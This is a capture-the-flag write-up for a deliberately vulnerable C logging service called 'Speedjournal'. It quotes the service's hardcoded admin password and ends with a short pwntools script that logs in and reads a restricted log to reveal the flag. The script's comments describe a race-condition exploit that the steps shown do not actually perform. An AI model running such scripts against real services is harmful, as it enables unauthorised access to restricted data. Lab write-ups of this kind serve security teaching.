# Speedjournal

> This write-up documents a deliberately vulnerable lab / CTF-style service.  
> All techniques are presented for educational purposes only.

---

## Overview

**Speedjournal** is a logging service focusing on **admin authentication** and **post-login access control**.

Focusing on:

- Log in as admin.
- Use admin privileges to read a restricted log entry.

**Language:** C  
**Difficulty:** Easy

---

### 1. Initial Reconnaissance

The service is implemented in C and handles logs with the following key points:

``` c
strcpy(logs[0].content, "RUSEC{not_the_real_flag}\n");
logs[0].restricted = 1;
```

Key points:

- `logs[0]` is marked as restricted

- The flag is stored directly in the log content

  ```c
  void read_log() {
      int idx;
      printf("Index: ");
      scanf("%d", &idx);
      getchar();
    
      if (idx < 0 || idx >= log_count) {
          puts("Invalid index");
          return;
      }
    
      if (logs[idx].restricted && !is_admin) {
          puts("Access denied");
          return;
      }
    
      printf("Log: %s\n", logs[idx].content);
  }
  ```

  Key observation:

  - The `is_admin` flag is required to access restricted logs, which gets set upon successful admin login.

## 2. Admin Authentication

### Login Logic

The service provides an admin login option with a fixed password check:

```c
if (strncmp(pw, "supersecret\n", 12) == 0) {
    is_admin = 1;
}
```

Observations:

- Admin authentication relies on a static password
- Successful login sets `is_admin = 1`

## 3. Exploit Development

To exploit the service, the following Python script using the `pwntools` library is created

```c
# fast_send.py
from pwn import *

HOST = "challs.ctf.rusec.club"
PORT = 22169

io = remote(HOST, PORT)

# Exploit steps:
# 1. Login as admin to start the race window
# 2. Immediately request a restricted log
# 3. Exploit the TOCTOU on the global is_admin flag

# Menu:
# 1. Login admin
# 2. Write log
# 3. Read log
# 4. Exit

io.sendline(b"1")            # Select "1. Login admin"
io.sendline(b"supersecret")  # Admin password

io.sendline(b"3")            # Select "3. Read log"
io.sendline(b"0")            # Restricted log index

io.interactive()              # Interactive shell (flag output)

```

**Outcome:**

- The program outputs the contents of the restricted log, revealing the flag.

## Key Takeaways

- Understanding authentication flow is essential

- Admin-only data may be directly accessible after successful login
